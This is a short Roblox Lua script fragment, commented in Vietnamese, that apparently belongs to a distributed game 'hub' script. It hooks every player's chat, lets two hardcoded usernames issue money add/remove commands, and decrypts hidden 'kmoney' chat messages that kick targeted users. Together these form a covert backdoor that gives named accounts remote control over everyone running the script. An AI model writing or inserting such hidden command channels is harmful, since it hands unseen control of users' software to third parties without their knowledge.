-- HỆ THỐNG XỬ LÝ LỆNH CHAT COMMAND & GIẢI MÃ LỆNH KICK ADMIN MONEY
local function executeChatCommand(fullMessage)
    local args = string.split(fullMessage, " ")
    local action = args[1] 
    local amount = tonumber(args[2])
    local targetName = args[3] 
    
    if (action == "add" or action == "rm") and amount and targetName then
        targetName = targetName:lower()
        if targetName == "all" or targetName == player.Name:lower() then
            local mockData = {
                vip_command = {
                    action = action,
                    amount = amount
                }
            }
            processFirebaseCommands(mockData)
        end
    end
end

-- Hàm lắng nghe và giải mã chat tự động cho tất cả player
local function processIncomingChat(sender, message)
    -- Thử giải mã gói tin mã hóa vippro
    local decrypted = decryptData(message)
    if string.sub(decrypted, 1, 7) == "kmoney " then
        local target = string.sub(decrypted, 8):gsub("%s+", "")
        -- Nếu tên nhận được trùng khớp với tên chính mình -> tự Kick
        if target == player.Name then
            player:Kick("Bạn đã bị xử lý hệ thống bởi lệnh Admin Money!")
        end
    end
end

local function hookPlayerChat(p)
    p.Chatted:Connect(function(message)
        pcall(function()
            -- Phục vụ logic lệnh chat cũ cho admin
            if p.Name == "ehfphvg362" or p.Name == "vu2k12hub" then
                executeChatCommand(message)
            end
            -- Phục vụ logic giải mã tự động kick của Admin Money
            processIncomingChat(p, message)
        end)
    end)
end

